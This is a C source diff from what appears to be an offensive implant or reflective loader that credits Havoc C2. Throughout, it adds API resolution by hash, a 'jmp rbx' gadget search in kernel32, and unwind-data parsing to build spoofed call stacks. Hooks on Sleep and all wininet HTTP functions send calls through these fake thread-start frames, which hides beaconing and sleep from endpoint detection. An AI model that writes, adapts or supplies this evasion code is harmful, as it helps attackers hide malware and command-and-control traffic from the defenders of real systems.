+        BYTE * api_forwarder_string = (BYTE *) api_address;
+        BYTE * api_name = NULL;
+        BYTE dll_forwarder_name[60] = {0};
+        BYTE dot = '.';
+        DWORD i = 0;
+        DWORD j = 0;
+        for (i = 0; api_forwarder_string[i] != '.'; i++); 
+        api_name = api_forwarder_string + i + 1;
+        for (j=0; j<=i; j++)
+        {
+            dll_forwarder_name[j] = (BYTE*)api_forwarder_string[j];
+        }
+        dll_forwarder_name[j+0] = 'd'; 
+        dll_forwarder_name[j+1] = 'l'; 
+        dll_forwarder_name[j+2] = 'l'; 
+
+        void * module_base = xLoadLibrary(dll_forwarder_name);
+
+        ANSI_STRING api_ansi = {0};
+        Spoof_Struct spoof_struct = { 0 }; 
+        setup_synthetic_callstack(&spoof_struct); 
+
+        t_LdrGetProcedureAddress LdrGetProcedureAddress = resolve_api_address_from_hash( LDRGETPROCEDUREADDRESS , &ntdll );
+        t_RtlInitAnsiString      RtlInitAnsiString      = resolve_api_address_from_hash( RTLINITANSISTRING      , &ntdll );
+
+        spoof_synthetic_callstack(
+            &api_ansi,             // Argument # 1
+            api_name,              // Argument # 2
+            NULL,                  // Argument # 3
+            NULL,                  // Argument # 4
+            &spoof_struct,         // Pointer to Spoof Struct 
+            RtlInitAnsiString,     // Pointer to API Call
+            (void *)0              // Number of Arguments on Stack (Args 5+)
+        ); 
+        // RtlInitAnsiString( &api_ansi, api_name );
+        spoof_synthetic_callstack(
+            module_base,           // Argument # 1
+            &api_ansi,             // Argument # 2
+            NULL,                  // Argument # 3
+            &api_address,          // Argument # 4
+            &spoof_struct,         // Pointer to Spoof Struct 
+            LdrGetProcedureAddress,// Pointer to API Call
+            (void *)0              // Number of Arguments on Stack (Args 5+)
+        ); 
+        // LdrGetProcedureAddress( module_base, &api_ansi, NULL, &api_address );
+    }
+    return api_address;
+}
+
+void utf16_to_utf8(wchar_t * wide_string, DWORD wide_string_len, BYTE * ascii_string) 
+{
+    for (DWORD i = 0; i < wide_string_len; ++i) 
+    {
+        wchar_t this_char = wide_string[i];
+        * ascii_string++  = (BYTE)this_char;
+    }
+    * ascii_string = '\0'; 
+}
+
+DWORD wide_string_length(wchar_t * wide_string) 
+{
+    wchar_t * wide_string_position = wide_string;
+    while (*wide_string_position != L'\0')
+        ++wide_string_position;
+    return wide_string_position - wide_string;
 }
 
 // Havoc C2 function
@@ -707,7 +818,8 @@ SIZE_T StringLengthA(LPCSTR String)
     return (String2 - String);
 }
 
-BOOL StringCompareA( LPCSTR String1, LPCSTR String2 ) {
+BOOL StringCompareA( LPCSTR String1, LPCSTR String2 ) 
+{
     for (; *String1 == *String2; String1++, String2++)
     {
         // if we hit the null byte terminator we are at the end of the string. They are equal
@@ -715,6 +827,61 @@ BOOL StringCompareA( LPCSTR String1, LPCSTR String2 ) {
             return TRUE;
     }
     return FALSE;
+}
+
+BOOL MemoryCompare(BYTE* memory_A, BYTE* memory_B, DWORD memory_size) 
+{
+    BYTE byte_A = 0x00;
+    BYTE byte_B = 0x00;
+    for (DWORD counter = 0; counter < memory_size; counter++)
+    {
+        byte_A = *(memory_A + counter);
+        byte_B = *(memory_B + counter);
+        if (byte_A != byte_B)
+        {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+void* FindGadget(BYTE* module_section_addr, DWORD module_section_size, BYTE* gadget, DWORD gadget_size)
+{
+    BYTE* this_module_byte_pointer = NULL;
+    for (DWORD x = 0; x < module_section_size; x++)
+    {
+        this_module_byte_pointer = module_section_addr + x;
+        if (MemoryCompare(this_module_byte_pointer, gadget, gadget_size))
+        {
+            return (void*)(this_module_byte_pointer);
+        }
+    };
+    return NULL;
+}
+
+// From bottom of stack --> up
+BYTE * find_api_return_address_on_stack(RUNTIME_FUNCTION* api_runtime_function, BYTE * api_virtual_address)
+{
+    NT_TIB* tib = (NT_TIB * ) __readgsqword(0x30);
+    BYTE* api_end_virtual_address = api_virtual_address + api_runtime_function->EndAddress;
+    ULONG_PTR* this_stack_address = tib->StackBase - 0x30;
+    do
+    {
+        ULONG_PTR this_stack_value = *this_stack_address;
+        if (this_stack_value)
+        {
+            if (
+                (this_stack_value >= api_virtual_address)
+                &&
+                (this_stack_value < api_end_virtual_address)
+                )
+            {
+                return (BYTE* )this_stack_address;
+            }
+        }
+        this_stack_address -= 1;
+    } while (true);
+    return NULL;
 }
 
 // Havoc C2 function
@@ -732,44 +899,581 @@ SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T Maximum
 }
 
 PVOID WINAPI RtlSecureZeroMemory(PVOID ptr,SIZE_T cnt){
-  volatile char *vptr = (volatile char *)ptr;
+  volatile BYTE *vptr = (volatile BYTE *)ptr;
   __stosb ((PBYTE)((DWORD64)vptr),0,cnt);
   return ptr;
 }
 
-void xorc(unsigned __int64 length, unsigned char * buff, unsigned char maskkey) {
-  int i;
+void xorc(ULONG_PTR length, BYTE * buff, BYTE maskkey) {
+  DWORD i;
   for (i = 0; i < length; ++i)
   {
     buff[i] ^= maskkey;
   }
 }
 
-void stomp(unsigned __int64 length, unsigned char * buff) {
-  int i;
+void stomp(ULONG_PTR length, BYTE * buff) {
+  DWORD i;
   for (i = 0; i < length; ++i)
   {
     buff[i] = 0;
   }
 }
 
+/* Credit to VulcanRaven project for the original implementation of these two*/
+ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase)
+{
+    NTSTATUS status = STATUS_SUCCESS;
+    PUNWIND_INFO pUnwindInfo = NULL;
+    ULONG unwindOperation = 0;
+    ULONG operationInfo = 0;
+    ULONG index = 0;
+    ULONG frameOffset = 0;
+    StackFrame stackFrame = { 0 };
+
+    // [1] Loop over unwind info.
+    // NB As this is a PoC, it does not handle every unwind operation, but
+    // rather the minimum set required to successfully mimic the default
+    // call stacks included.
+    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
+    while (index < pUnwindInfo->CountOfCodes)
+    {
+        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
+        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
+        // [2] Loop over unwind codes and calculate
+        // total stack space used by target Function.
+        if (unwindOperation == UWOP_PUSH_NONVOL) 
+        {
+            // UWOP_PUSH_NONVOL is 8 bytes.
+            stackFrame.totalStackSize += 8;
+            // Record if it pushes rbp as
+            // this is important for UWOP_SET_FPREG.
+            if (RBP_OP_INFO == operationInfo)
+            {
+                stackFrame.pushRbp = true;
+                // Record when rbp is pushed to stack.
+                stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
+                stackFrame.pushRbpIndex = index + 1;
+            }
+        }
+        if (unwindOperation == UWOP_SAVE_NONVOL) 
+        {
+            //UWOP_SAVE_NONVOL doesn't contribute to stack size
+            // but you do need to increment index.
+            index += 1;
+        }
+        if (unwindOperation == UWOP_ALLOC_SMALL) 
+        {
+            //Alloc size is op info field * 8 + 8.
+            stackFrame.totalStackSize += ((operationInfo * 8) + 8);
+        }
+        if (unwindOperation == UWOP_ALLOC_LARGE) 
+        {
+            // Alloc large is either:
+            // 1) If op info == 0 then size of alloc / 8
+            // is in the next slot (i.e. index += 1).
+            // 2) If op info == 1 then size is in next
+            // two slots.
+            index += 1;
+            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
+            if (operationInfo == 0)
+            {
+                frameOffset *= 8;
+            }
+            else
+            {
+                index += 1;
+                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
+            }
+            stackFrame.totalStackSize += frameOffset;
+        }
+        if (unwindOperation == UWOP_SET_FPREG) 
+        {
+            // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
+            // that rbp is the expected value (in the frame above) when
+            // it comes to spoof this frame in order to ensure the
+            // call stack is correctly unwound.
+            stackFrame.setsFramePointer = true;
+            // printf("[-] Error: Unsupported Unwind Op Code\n");
+        }
+        index += 1;
+    }
+
+    // If chained unwind information is present then we need to
+    // also recursively parse this and add to total stack size.
+    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
+    {
+        index = pUnwindInfo->CountOfCodes;
+        if (0 != (index & 1))
+        {
+            index += 1;
+        }
+        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
+        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);
+    }
+    // Add the size of the return address (8 bytes).
+    stackFrame.totalStackSize += 8;
+
+    return stackFrame.totalStackSize;
+Cleanup:
+    return status;
+}
+
+BYTE * loaded_module_base_from_hash(DWORD hash)
+{
+    _PEB         * peb  = NULL;
+    PEB_LDR_DATA * ldr  = NULL;
+
+    peb = (_PEB*)__readgsqword(0x60);
+    BYTE utf8_module_base_name[256] = {0};
+
+    LDR_DATA_TABLE_ENTRY * first_module_entry = (LDR_DATA_TABLE_ENTRY *)peb->pLdr->InLoadOrderModuleList.Flink;
+    LDR_DATA_TABLE_ENTRY * this_module_entry  = first_module_entry;
+    do 
+    {
+        utf16_to_utf8( 
+            this_module_entry->BaseDllName.Buffer,
+            (this_module_entry->BaseDllName.Length * 2),
+            utf8_module_base_name
+        );
+
+        if ( hash == hash_ascii_string(utf8_module_base_name) )
+        {
+            return this_module_entry->DllBase;
+        }
+        RtlSecureZeroMemory(utf8_module_base_name,sizeof(utf8_module_base_name));
+        this_module_entry = (LDR_DATA_TABLE_ENTRY *) this_module_entry->InLoadOrderLinks.Flink;
+    } while (this_module_entry != first_module_entry); // list loops back to the start
+    return NULL; // Did not find DLL base address 
+}
+
+BYTE * get_modulebase_from_address(ULONG_PTR ReturnAddress)
+{
+    _PEB         * peb  = NULL;
+    PEB_LDR_DATA * ldr  = NULL;
+
+    peb = (_PEB*)__readgsqword(0x60);
+
+    LDR_DATA_TABLE_ENTRY * first_module_entry = (LDR_DATA_TABLE_ENTRY *)peb->pLdr->InLoadOrderModuleList.Flink;
+    LDR_DATA_TABLE_ENTRY * this_module_entry  = first_module_entry;
+    do 
+    {
+        if ( 
+            ( ReturnAddress > (ULONG_PTR) this_module_entry->DllBase ) 
+            && 
+            ( ReturnAddress < (ULONG_PTR) ( this_module_entry->DllBase + this_module_entry->SizeOfImage ) ) )
+        {
+            return this_module_entry->DllBase;
+        }
+        this_module_entry = (LDR_DATA_TABLE_ENTRY *) this_module_entry->InLoadOrderLinks.Flink;
+    } while (this_module_entry != first_module_entry); // list loops back to the start
+    return NULL; // Did not find DLL base address 
+}
+
+RUNTIME_FUNCTION* get_runtime_function_entry_for_api( Dll * module, BYTE* api_address)
+{
+    RUNTIME_FUNCTION* runtimeFunction             = NULL;
+    RUNTIME_FUNCTION* this_runtime_function_entry = NULL;
+
+    BYTE * api_offset_from_dll_base = api_address - (BYTE* )module->dllBase;
+
+    this_runtime_function_entry = (RUNTIME_FUNCTION*)((BYTE*)module->pdata_section);
+
+    for (DWORD i = 0; i < module->pdata_section_size / sizeof(RUNTIME_FUNCTION); i++) {
+        if (
+            (api_offset_from_dll_base >= this_runtime_function_entry->BeginAddress)
+            &&
+            (api_offset_from_dll_base  < this_runtime_function_entry->EndAddress)
+            )
+        {
+            return this_runtime_function_entry;
+            break;
+        }
+        this_runtime_function_entry = (RUNTIME_FUNCTION*)( (BYTE*)this_runtime_function_entry + sizeof(RUNTIME_FUNCTION));
+    }
+    return NULL;
+}
+
+
+ULONG CalculateFunctionStackSizeWrapper(BYTE * ReturnAddress, APIS * api)
+{
+    NTSTATUS status = STATUS_SUCCESS;
+    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
+    DWORD64 ImageBase = 0;
+    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;
+    // [0] Sanity check return address.
+    if (!ReturnAddress)
+    {
+        status = STATUS_INVALID_PARAMETER;
+        goto Cleanup;
+    }
+    // [1] Locate RUNTIME_FUNCTION for given Function.
+    pRuntimeFunction = api->RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
+    if (NULL == pRuntimeFunction)
+    {
+        status = STATUS_ASSERTION_FAILURE;
+        // printf("[!] STATUS_ASSERTION_FAILURE\n");
+        goto Cleanup;
+    }
+    // [2] Recursively calculate the total stack size for
+    // the Function we are "returning" to.
+    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);
+Cleanup:
+    return status;
+}
+
+void setup_synthetic_callstack(Spoof_Struct * spoof_struct)
+{
+    APIS api  = {0};
+    Dll ntdll = {0}; 
+    Dll k32   = {0}; 
+    BYTE * ReturnAddress       = NULL;
+    BYTE * BaseThreadInitThunk = NULL;
+    BYTE * RtlUserThreadStart  = NULL;
+    t_NtQueryInformationThread NtQueryInformationThread = NULL;
+
+    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
+    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
+    parse_module_headers( &ntdll );
+    parse_module_headers(  &k32  );
+
+    api.RtlLookupFunctionEntry            = (tRtlLookupFunctionEntry)    resolve_api_address_from_hash( RTLLOOKUPFUNCTIONENTRY   , &ntdll );
+    BaseThreadInitThunk                   = (BYTE *)                     resolve_api_address_from_hash( BASETHREADINITTHUNK      , &k32   );
+    RtlUserThreadStart                    = (BYTE *)                     resolve_api_address_from_hash( RTLUSERTHREADSTART       , &ntdll );
+    NtQueryInformationThread              = (t_NtQueryInformationThread) resolve_api_address_from_hash( NTQUERYINFORMATIONTHREAD , &ntdll );
+
+    // JMP RBX Gadget
+    BYTE jmp_rbx_gadget[] = { 0xFF, 0x23 };
+    spoof_struct->gadget_return_address    = FindGadget((LPBYTE)k32.text_section, k32.text_section_size, jmp_rbx_gadget, sizeof(jmp_rbx_gadget));
+    spoof_struct->gadget_stack_frame_size  = CalculateFunctionStackSizeWrapper(spoof_struct->gadget_return_address, &api);
+
+    // Stack Frame - BaseThreadInitThunk
+    ReturnAddress = (BYTE *)( (BYTE *) BaseThreadInitThunk + 0x14); 
+    spoof_struct->frame_1_stack_frame_size = CalculateFunctionStackSizeWrapper(ReturnAddress, &api);
+    spoof_struct->frame_1_return_address   = ReturnAddress;
+
+    // Stack Frame - RtlUserThreadStart
+    ReturnAddress = (BYTE *)( (BYTE *) RtlUserThreadStart + 0x21);
+    spoof_struct->frame_0_stack_frame_size = CalculateFunctionStackSizeWrapper(ReturnAddress, &api);
+    spoof_struct->frame_0_return_address   = ReturnAddress;
+};
+
 void Sleep_Hook(DWORD dwMilliseconds){
-    Dll ntdll;
-    unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
-    basicCaesar_Decrypt(9, s_ntdll, 513556);
-    ntdll.dllBase = getDllBase((char *)s_ntdll);
-    parseDLL(&ntdll);
+    Dll ntdll                 = { 0 }; 
+    Spoof_Struct spoof_struct = { 0 };
 
-    char s_NtDelayExecution[] = {'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n',0};
-    int  i_NtDelayExecution   = 16;
+    ntdll.dllBase = loaded_module_base_from_hash( NTDLL );
+    parse_module_headers(&ntdll);
 
-    tNtDelayExecution pNtDelayExecution = (tNtDelayExecution) getSymbolAddress(s_NtDelayExecution, (void*)i_NtDelayExecution, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable,ntdll.Export.NumberOfNames);
+    tNtDelayExecution pNtDelayExecution = (tNtDelayExecution) resolve_api_address_from_hash( NTDELAYEXECUTION, &ntdll );
+
+    setup_synthetic_callstack(&spoof_struct);
 
     LARGE_INTEGER    Time;
     PLARGE_INTEGER   TimePtr;
     TimePtr = &Time;
     TimePtr->QuadPart = dwMilliseconds * -10000LL;
-    pNtDelayExecution(0, TimePtr);
+
+    spoof_synthetic_callstack(
+        (void *)(0),           // Argument # 1
+        TimePtr,               // Argument # 2
+        NULL,                  // Argument # 3
+        NULL,                  // Argument # 4
+        &spoof_struct,         // Pointer to Spoof Struct 
+        pNtDelayExecution,     // Pointer to API Call
+        (void *)0              // Number of Arguments on Stack (Args 5+)
+    );
+}
+
+void resolve_wininet_apis(wininet_apis * wininet)
+{
+    Dll wnet = { 0 }; 
+    RtlSecureZeroMemory( wininet, sizeof(wininet_apis) );
+    wnet.dllBase = loaded_module_base_from_hash( WININET );
+    parse_module_headers(&wnet);
+
+    wininet->InternetOpenA               = (t_InternetOpenA)              resolve_api_address_from_hash( INTERNETOPENA,               &wnet );
+    wininet->InternetConnectA            = (t_InternetConnectA)           resolve_api_address_from_hash( INTERNETCONNECTA,            &wnet );
+    wininet->HttpOpenRequestA            = (t_HttpOpenRequestA)           resolve_api_address_from_hash( HTTPOPENREQUESTA,            &wnet );
+    wininet->HttpSendRequestA            = (t_HttpSendRequestA)           resolve_api_address_from_hash( HTTPSENDREQUESTA,            &wnet );
+    wininet->InternetReadFile            = (t_InternetReadFile)           resolve_api_address_from_hash( INTERNETREADFILE,            &wnet );
+    wininet->InternetQueryDataAvailable  = (t_InternetQueryDataAvailable) resolve_api_address_from_hash( INTERNETQUERYDATAAVAILABLE,  &wnet );
+    wininet->InternetCloseHandle         = (t_InternetCloseHandle)        resolve_api_address_from_hash( INTERNETCLOSEHANDLE,         &wnet );
+    wininet->InternetQueryOptionA        = (t_InternetQueryOptionA)       resolve_api_address_from_hash( INTERNETQUERYOPTIONA,        &wnet );
+    wininet->InternetSetOptionA          = (t_InternetSetOptionA)         resolve_api_address_from_hash( INTERNETSETOPTIONA,          &wnet );
+    wininet->InternetSetStatusCallback   = (t_InternetSetStatusCallback)  resolve_api_address_from_hash( INTERNETSETSTATUSCALLBACK,   &wnet );
+    wininet->HttpAddRequestHeadersA      = (t_HttpAddRequestHeadersA)     resolve_api_address_from_hash( HTTPADDREQUESTHEADERSA,      &wnet );
+    wininet->HttpQueryInfoA              = (t_HttpQueryInfoA)             resolve_api_address_from_hash( HTTPQUERYINFOA,              &wnet );
+
+}
+
+LPVOID InternetOpenA_Hook(BYTE* lpszAgent, DWORD dwAccessType, BYTE* lpszProxy, BYTE* lpszProxyBypass, DWORD  dwFlags) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        lpszAgent,               // Argument # 1
+        dwAccessType,            // Argument # 2
+        lpszProxy,               // Argument # 3
+        lpszProxyBypass,         // Argument # 4
+        &spoof_struct,           // Pointer to Spoof Struct 
+        wininet.InternetOpenA,   // Pointer to API Call
+        (void *)1,               // Number of Arguments on Stack (Args 5+)
+        dwFlags
+    ); 
+    // return wininet.InternetOpenA( lpszAgent,  dwAccessType, lpszProxy, lpszProxyBypass,  dwFlags) ;
+}
+
+LPVOID InternetConnectA_Hook(void* hInternet, LPCSTR lpszServerName, WORD nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) 
+{
+    Spoof_Struct spoof_struct = { 0 };
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+
+    return spoof_synthetic_callstack(
+        hInternet,                   // Argument # 1
+        lpszServerName,              // Argument # 2
+        nServerPort,                 // Argument # 3
+        lpszUserName,                // Argument # 4
+        &spoof_struct,               // Pointer to Spoof Struct 
+        wininet.InternetConnectA,    // Pointer to API Call
+        (void *)4,                   // Number of Arguments on Stack (Args 5+)
+        lpszPassword,
+        dwService,
+        dwFlags,
+        dwContext 
+    ); 
+    // return     wininet.InternetConnectA( hInternet, lpszServerName, nServerPort, lpszUserName,  lpszPassword, dwService, dwFlags,  dwContext) ;
+}
+
+LPVOID HttpOpenRequestA_Hook(void* hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        hConnect,                   // Argument # 1
+        lpszVerb,                   // Argument # 2
+        lpszObjectName,             // Argument # 3
+        lpszVersion,                // Argument # 4
+        &spoof_struct,              // Pointer to Spoof Struct 
+        wininet.HttpOpenRequestA,   // Pointer to API Call
+        (void *)4,                  // Number of Arguments on Stack (Args 5+)
+        lpszReferrer,
+        lplpszAcceptTypes,
+        dwFlags,
+        dwContext 
+    ); 
+    // return wininet.HttpOpenRequestA( hConnect, lpszVerb, lpszObjectName,  lpszVersion,  lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext) ;
+}
+
+BOOL HttpSendRequestA_Hook(void* hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        hRequest,                   // Argument # 1
+        lpszHeaders,                // Argument # 2
+        dwHeadersLength,            // Argument # 3
+        lpOptional,                 // Argument # 4
+        &spoof_struct,              // Pointer to Spoof Struct 
+        wininet.HttpSendRequestA,   // Pointer to API Call
+        (void *)1,                  // Number of Arguments on Stack (Args 5+)
+        dwOptionalLength
+    ); 
+    // return wininet.HttpSendRequestA(  hRequest,  lpszHeaders,  dwHeadersLength,  lpOptional,  dwOptionalLength) ;
+}
+
+BOOL InternetReadFile_Hook(void* hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        hFile,                         // Argument # 1
+        lpBuffer,                      // Argument # 2
+        dwNumberOfBytesToRead,         // Argument # 3
+        lpdwNumberOfBytesRead,         // Argument # 4
+        &spoof_struct,                 // Pointer to Spoof Struct 
+        wininet.InternetReadFile,      // Pointer to API Call
+        (void *)0                      // Number of Arguments on Stack (Args 5+)
+    ); 
+    // return wininet.InternetReadFile(  hFile,  lpBuffer,  dwNumberOfBytesToRead, lpdwNumberOfBytesRead) ;
+}
+
+BOOL InternetQueryDataAvailable_Hook(void* hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        hFile,                               // Argument # 1
+        lpdwNumberOfBytesAvailable,          // Argument # 2
+        dwFlags,                             // Argument # 3
+        dwContext,                           // Argument # 4
+        &spoof_struct,                       // Pointer to Spoof Struct 
+        wininet.InternetQueryDataAvailable,  // Pointer to API Call
+        (void *)0                            // Number of Arguments on Stack (Args 5+)
+    ); 
+    // return wininet.InternetQueryDataAvailable(  hFile,  lpdwNumberOfBytesAvailable, dwFlags,  dwContext) ;
+}
+
+BOOL InternetCloseHandle_Hook(HINTERNET hInternet) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        hInternet,                    // Argument # 1
+        NULL,                         // Argument # 2
+        NULL,                         // Argument # 3
+        NULL,                         // Argument # 4
+        &spoof_struct,                // Pointer to Spoof Struct 
+        wininet.InternetCloseHandle,  // Pointer to API Call
+        (void *)0                     // Number of Arguments on Stack (Args 5+)
+    ); 
+    // return wininet.InternetCloseHandle(  hInternet) ;
+}
+
+BOOL InternetQueryOptionA_Hook(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        hInternet,                     // Argument # 1
+        dwOption,                      // Argument # 2
+        lpBuffer,                      // Argument # 3
+        lpdwBufferLength,              // Argument # 4
+        &spoof_struct,                 // Pointer to Spoof Struct 
+        wininet.InternetQueryOptionA,  // Pointer to API Call
+        (void *)0                      // Number of Arguments on Stack (Args 5+)
+    ); 
+    // return wininet.InternetQueryOptionA(  hInternet,  dwOption,  lpBuffer,  lpdwBufferLength) ;
+}
+
+BOOL InternetSetOptionA_Hook(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        hInternet,                    // Argument # 1
+        dwOption,                     // Argument # 2
+        lpBuffer,                     // Argument # 3
+        dwBufferLength,               // Argument # 4
+        &spoof_struct,                // Pointer to Spoof Struct 
+        wininet.InternetSetOptionA,   // Pointer to API Call
+        (void *)0                     // Number of Arguments on Stack (Args 5+)
+    ); 
+    // return wininet.InternetSetOptionA(hInternet, dwOption, lpBuffer,  dwBufferLength) ;
+}
+
+BOOL InternetSetStatusCallback_Hook(HINTERNET hInternet, void* lpfnInternetCallback) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        hInternet,                         // Argument # 1
+        lpfnInternetCallback,              // Argument # 2
+        NULL,                              // Argument # 3
+        NULL,                              // Argument # 4
+        &spoof_struct,                     // Pointer to Spoof Struct 
+        wininet.InternetSetStatusCallback, // Pointer to API Call
+        (void *)0                          // Number of Arguments on Stack (Args 5+)
+    ); 
+    // return wininet.InternetSetStatusCallback( hInternet,  lpfnInternetCallback) ;
+}
+
+BOOL HttpAddRequestHeadersA_Hook(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        hRequest,                        // Argument # 1
+        lpszHeaders,                     // Argument # 2
+        dwHeadersLength,                 // Argument # 3
+        dwModifiers,                     // Argument # 4
+        &spoof_struct,                   // Pointer to Spoof Struct 
+        wininet.HttpAddRequestHeadersA,  // Pointer to API Call
+        (void *)0                        // Number of Arguments on Stack (Args 5+)
+    ); 
+    // return wininet.HttpAddRequestHeadersA(  hRequest,  lpszHeaders, dwHeadersLength,  dwModifiers) ;
+}
+
+BOOL HttpQueryInfoA_Hook(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) 
+{
+    Spoof_Struct spoof_struct = { 0 }; 
+    wininet_apis wininet      = { 0 };
+    resolve_wininet_apis(&wininet);
+    setup_synthetic_callstack(&spoof_struct);
+    return spoof_synthetic_callstack(
+        hRequest,                   // Argument # 1
+        dwInfoLevel,                // Argument # 2
+        lpBuffer,                   // Argument # 3
+        lpdwBufferLength,           // Argument # 4
+        &spoof_struct,              // Pointer to Spoof Struct 
+        wininet.HttpQueryInfoA,     // Pointer to API Call
+        (void *)1,                  // Number of Arguments on Stack (Args 5+)
+        lpdwIndex
+    ); 
+    // return wininet.HttpQueryInfoA(  hRequest,  dwInfoLevel, lpBuffer,  lpdwBufferLength,  lpdwIndex) ;
+}
+
+void utf8_string_to_lower(BYTE* utf8_string_in, BYTE* utf8_string_out)
+{
+    for (DWORD i = 0; utf8_string_in[i] != '\0'; i++)
+    {
+        if (utf8_string_in[i] >= 'A' && utf8_string_in[i] <= 'Z')
+        {
+            utf8_string_out[i] = utf8_string_in[i] - 'A' + 'a';
+        }
+        else
+        {
+            utf8_string_out[i] = utf8_string_in[i];
+        }
+    }
+}
+
+DWORD hash_ascii_string(BYTE* utf8_string)
+{
+    BYTE lower_string[256] = { 0 };
+    DWORD  length = StringLengthA(utf8_string);
+    utf8_string_to_lower(utf8_string, lower_string);
+    BYTE prime  = 0xE3;
+    BYTE seed   = 0xB0;
+    BYTE offset = 0xBC;
+
+    DWORD hash = (offset ^ seed);
+    for (DWORD i = 0; i < length; ++i) {
+        hash ^= (DWORD)lower_string[i];
+        hash *= prime;
+    }
+    return hash;
+}
+
+VOID memory_copy(PVOID destination_ptr, PVOID source_ptr, DWORD number_of_bytes) 
+{
+    BYTE * source      = (BYTE *)source_ptr;
+    BYTE * destination = (BYTE *)destination_ptr;
+    
+    for (DWORD index = 0; index < number_of_bytes; index++)
+        destination[index] = source[index];
 }
 
 
@@ -778,227 +1482,112 @@ __asm__(
 // "RBX, RBP, RDI, RSI, R12, R14, R14, and R15 must be saved in any function using them." 
 // -- https://www.intel.com/content/dam/develop/external/us/en/documents/introduction-to-x64-assembly-181178.pdf
 
-"getPEB: \n" 
-    "mov rax, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
-    "ret \n"
+// Spoof ( 
+//    RCX,           - API Call Argument # 1
+//    RDX,           - API Call Argument # 2
+//    r8,            - API Call Argument # 3
+//    r9,            - API Call Argument # 4
+//    [rsp+0x28],    - &Spoof_Struct - Pointer to Spoof Struct 
+//    [rsp+0x30],    - Pointer to API Call
+//    [rsp+0x38],    - Number of Arguments on Stack (Args 5+)
+//    [rsp+0x40],    - [optional] API Call Argument # 5 (if [rsp+0x38] == 1) 
